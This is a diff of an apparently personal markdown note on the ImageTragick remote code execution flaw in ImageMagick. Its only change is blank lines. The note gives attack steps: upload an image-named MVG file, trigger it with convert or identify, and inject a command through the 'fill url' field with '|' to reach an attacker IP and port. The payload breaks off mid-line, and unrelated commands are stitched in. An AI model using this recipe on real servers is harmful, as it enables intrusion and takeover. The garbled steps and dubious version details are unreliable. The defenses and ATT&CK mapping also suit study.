@@ -36,6 +36,8 @@ Technical Explanation: The vulnerability lies in the ImageMagick policy.xml file
 
 Business Value: By exploiting this vulnerability, attackers can gain full control of the target system, steal sensitive data, and disrupt business operations.
 
+ 
+
 ## Requirements
 
 1. Access to the target server
@@ -43,6 +45,8 @@ Business Value: By exploiting this vulnerability, attackers can gain full contro
 1. Ability to upload files to the server
 
 1. ImageMagick installed on the server
+
+ 
 
 ## Defense
 
@@ -52,27 +56,45 @@ Business Value: By exploiting this vulnerability, attackers can gain full contro
 
 1. Regularly update ImageMagick to the latest version to patch known vulnerabilities
 
+ 
+
 ## Objectives
 
 1. Upload a malicious file to the server
 
 1. Execute arbitrary code remotely
 
+ 
+
 # Instructions
 
 1. To execute this command, upload the content with an image extension and run the following command: 'convert image.jpg exploit.mvg' and then use the following command to execute the payload: 'identify -verbose exploit.mvg'
+
+ 
+
+
 
 **Code**: [[push graphic-context
 viewbox 0 0 640 480
 fill 'url]]
 
+
+
 > This command exploits a vulnerability in ImageMagick version 7.0.1-1. The 'fill' command in the 'push graphic-context' section of the payload is used to specify a URL that contains a command to be executed. The command is enclosed in single quotes and is executed using the '|' character. The attacker can replace the 'attacker-ip' and 'attacker-port' with their own IP address and port number, respectively. The payload can be executed by converting the uploaded image to an MVG (Magick Vector Graphics) file and then using the 'identify' command with the '-verbose' flag to trigger the vulnerability.
 
 2. To add payloads to a folder, use the 'add' command followed by the folder name and the payload name(s) separated by a space. For example: 'add folder_name payload1 payload2'
 
+ 
+
+
+
 **Code**: [[Picture Image Magik]]
 
+
+
 > The 'add' command allows you to add one or more payloads to a specific folder. The 'folder_name' argument specifies the name of the folder you want to add the payloads to. The 'payload1' and 'payload2' arguments represent the names of the payloads you want to add to the folder. You can add as many payloads as you want, just separate them with a space.
+
+
 
 **Command** ([[Convert image format]]):
 
@@ -80,17 +102,27 @@ fill 'url]]
 convert input.jpg output.png
 ```
 
+
+
+
+
 **Command** ([[Resize image]]):
 
 ```bash
 convert -resize 50% input.png output.png
 ```
 
+
+
+
+
 **Command** ([[Add border to image]]):
 
 ```bash
 convert -border 10x10 input.png output.png
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -113,3 +145,5 @@ convert -border 10x10 input.png output.png
 - [[CVE - Image Tragik]]
 - [[Exploits]]
 - [[Upload Insecure Files]]
+
+
